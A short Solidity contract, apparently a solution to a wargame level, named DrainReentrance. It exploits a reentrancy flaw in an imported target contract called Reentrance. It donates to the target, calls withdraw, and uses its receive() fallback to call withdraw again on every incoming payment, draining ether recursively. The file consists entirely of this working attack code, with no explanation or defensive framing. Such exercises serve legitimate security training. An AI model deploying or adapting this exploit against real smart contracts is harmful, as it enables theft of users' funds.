// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";
import "./10_Reentrance.sol";

contract DrainReentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;
    address payable reentrance;

    constructor(address payable _reentrance) public {
        reentrance = _reentrance;
    }

    function donateToReentrance(uint _eth) public payable {
        Reentrance(reentrance).donate{value: _eth}(address(this));
    }

    function attack(uint256 _amount) public {
        Reentrance(reentrance).withdraw(_amount);
    }

    receive() external payable {
        Reentrance(reentrance).withdraw(1000000000000000);
    }
}
